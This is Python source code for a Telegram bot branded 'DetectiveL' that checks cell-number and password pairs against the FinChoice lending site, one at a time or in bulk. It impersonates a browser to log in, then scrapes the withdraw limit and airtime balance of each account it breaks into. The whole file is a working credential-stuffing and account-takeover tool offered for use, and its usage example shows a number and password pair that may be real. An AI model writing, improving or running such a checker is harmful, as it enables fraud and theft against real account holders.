# ==============================================
# 🚀 REPLIT KEEP-ALIVE — ADDED FIRST!
# ==============================================
from flask import Flask
import threading
app = Flask('')
@app.route('/')
def home(): return "✅ FinChoice Checker Bot is ALIVE!"
def run_server(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run_server, daemon=True).start()

# ==============================================
# 🤖 FINCHOICE CHECKER BOT CODE
# ==============================================
import re
import os
import time
import json
from curl_cffi import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    MessageHandler, filters
)

# ---------------- CONFIG ----------------
LOGIN_GET_URL = "https://www.finchoice.mobi/login"
LOGIN_POST_URL = "https://www.finchoice.mobi/login/"
MOBIMONEY_URL = "https://www.finchoice.mobi/Reloan/ProductDetails/MobiMoney"
AIRTIME_URL = "https://www.finchoice.mobi/Prepaid/FailReasonScreen?failReasonType=NoProductsAvailableForRemainingLimit&productType=Airtime&availableLimit=0&minimumLimit=10&canWithdrawMobiMoney=False"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded"
}

TARGET_BOT_LINK = "https://t.me/Fatherofallgoat"
BOT_BRAND = "DetectiveL"

CONFIG_FILE = "config.json"
OUTPUT_FOLDER = "finchoice_results"
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

# ---------------- SOUTH AFRICA NUMBER FIX ----------------
def clean_sa_number(cell: str) -> str:
    """Auto-clean any SA number format to 082xxxxxxx"""
    cell = re.sub(r"[^0-9]", "", cell.strip())
    if cell.startswith("27") and len(cell) == 11:
        return "0" + cell[2:]
    if len(cell) == 9:
        return "0" + cell
    if len(cell) == 10 and cell.startswith("0"):
        return cell
    return cell

# ---------------- FIXED CHECKER ----------------
def check_account(raw_cell: str, password: str):
    session = requests.Session(impersonate="chrome124", timeout=25)
    session.headers.update(HEADERS)

    try:
        # Step 1: Get login page to set cookies
        get_resp = session.get(LOGIN_GET_URL)
        if get_resp.status_code != 200:
            return "Error", f"Site unreachable (Status {get_resp.status_code})", None, None
        time.sleep(1)

        # Step 2: Login with cleaned number
        cell = clean_sa_number(raw_cell)
        login_data = {
            "Username": cell,
            "Password": password.strip()
        }
        login_response = session.post(
            LOGIN_POST_URL,
            data=login_data,
            allow_redirects=True
        )
        login_text = login_response.text.lower()

        # ❌ Failed cases
        if any(x in login_text for x in [
            "incorrect cell number or password",
            "invalid username or password",
            "welcome to finchoice",
            "don't have an account?"
        ]):
            return "Failure", "Wrong cell number or password", None, None

        # ✅ Success case
        if any(x in login_text for x in ["my accounts", "dashboard", "logout", "sign out"]):
            # Get Withdraw Limit
            withdraw_limit = "Not available"
            try:
                mobi_resp = session.get(MOBIMONEY_URL)
                mobi_text = mobi_resp.text
                match = re.search(r"withdraw.*?r\s*([\d\s,.]+)|r\s*([\d\s,.]+).*?withdraw", mobi_text, re.I)
                if match:
                    val = match.group(1) or match.group(2)
                    withdraw_limit = f"R {val.strip().replace(' ', '')}"
            except:
                pass

            # Get Available Balance/Airtime
            airtime = "R 0.00"
            try:
                airtime_resp = session.get(AIRTIME_URL)
                airtime_text = airtime_resp.text
                balance_match = re.search(r"available.*?r\s*([\d,.]+)|r\s*([\d,.]+).*?available|balance.*?r\s*([\d,.]+)", airtime_text, re.I)
                if balance_match:
                    val = next((g for g in balance_match.groups() if g), "0.00")
                    airtime = f"R {val.strip()}"
            except:
                pass

            return "Success", "✅ Login successful", withdraw_limit, airtime

        return "Failure", "Unknown response — account may be locked", None, None

    except Exception as e:
        err = str(e)
        if "timeout" in err.lower():
            return "Error", "Connection timed out — site busy", None, None
        if "connect" in err.lower():
            return "Error", "Failed to connect — network/proxy issue", None, None
        return "Error", f"Error: {err[:80]}", None, None

# ---------------- TELEGRAM COMMANDS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[InlineKeyboardButton("🤖 Main Bot", url=TARGET_BOT_LINK)]]
    await update.message.reply_text(
        f"<b>🔹 FinChoice Checker | {BOT_BRAND}</b>\n\n"
        f"📌 Single check:\n"
        f"<code>/check 0763776747|Selby@1994</code>\n\n"
        f"📌 Bulk check: Upload .txt file with <code>cell|password</code> lines\n\n"
        f"✅ Auto-cleans SA numbers\n✅ Checks withdraw limit + balance\n"
        f"🔗 {TARGET_BOT_LINK}",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="HTML"
    )

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or "|" not in " ".join(context.args):
        await update.message.reply_text("<b>❌ Usage: /check 0763776747|Selby@1994</b>", parse_mode="HTML")
        return

    arg = " ".join(context.args)
    cell, pwd = arg.split("|", 1)
    cell, pwd = cell.strip(), pwd.strip()

    msg = await update.message.reply_text(f"🔍 Checking `{cell}`...", parse_mode="Markdown")
    status, info, withdraw, airtime = check_account(cell, pwd)

    if status == "Success":
        text = (f"<b>✅ VALID ACCOUNT | {BOT_BRAND}</b>\n"
                f"📱 Cell: <code>{cell}</code>\n"
                f"🔐 Status: {info}\n"
                f"💸 Withdraw Limit: <code>{withdraw}</code>\n"
                f"📶 Available Airtime/Balance: <code>{airtime}</code>\n\n"
                f"🔗 {TARGET_BOT_LINK}")
    else:
        text = f"<b>❌ {status} | {BOT_BRAND}</b>\n📱 {cell}\n⚠️ {info}"

    await msg.edit_text(text, parse_mode="HTML")

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("⚠️ Send .txt with format: <code>cell|password</code>", parse_mode="HTML")
        return

    file = await doc.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode("utf-8", errors="ignore").splitlines()
    accounts = [l.strip() for l in lines if l.strip() and "|" in l]

    if not accounts:
        await update.message.reply_text("❌ No valid accounts found")
        return

    msg = await update.message.reply_text(f"📋 Checking {len(accounts)} accounts...")
    valid, invalid = [], []

    for idx, acc in enumerate(accounts, 1):
        cell, pwd = acc.split("|", 1)
        status, info, withdraw, airtime = check_account(cell, pwd)
        line = f"{cell}|{pwd}|{withdraw or 'N/A'}|{airtime or 'N/A'}|{info}"
        valid.append(line) if status == "Success" else invalid.append(line)
        await msg.edit_text(f"⏳ {idx}/{len(accounts)} — {cell}", parse_mode="Markdown")
        time.sleep(1.5)

    valid_path = os.path.join(OUTPUT_FOLDER, "Valid_Accounts.txt")
    invalid_path = os.path.join(OUTPUT_FOLDER, "Invalid_Accounts.txt")
    with open(valid_path, "w", encoding="utf-8") as f: f.write("\n".join(valid))
    with open(invalid_path, "w", encoding="utf-8") as f: f.write("\n".join(invalid))

    await msg.edit_text(f"✅ Done! Valid: {len(valid)} | Invalid: {len(invalid)} | {BOT_BRAND}", parse_mode="HTML")
    await update.message.reply_document(valid_path, caption=f"✅ Valid Accounts | Withdraw + Airtime | {BOT_BRAND}")
    await update.message.reply_document(invalid_path, caption=f"❌ Invalid Accounts | {BOT_BRAND}")

# ---------------- RUN ----------------
if __name__ == "__main__":
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        token = cfg["token"]
    except:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({"token":"PUT_YOUR_TELEGRAM_BOT_TOKEN_HERE"}, f, indent=4)
        print("⚠️ Edit config.json and add your bot token, then run again!")
        exit(1)

    app = ApplicationBuilder().token(token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", single_check))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_bulk_file))

    print(f"✅ {BOT_BRAND} Bot Running — Keep-Alive + Fixed Checks!")
    app.run_polling(drop_pending_updates=True)
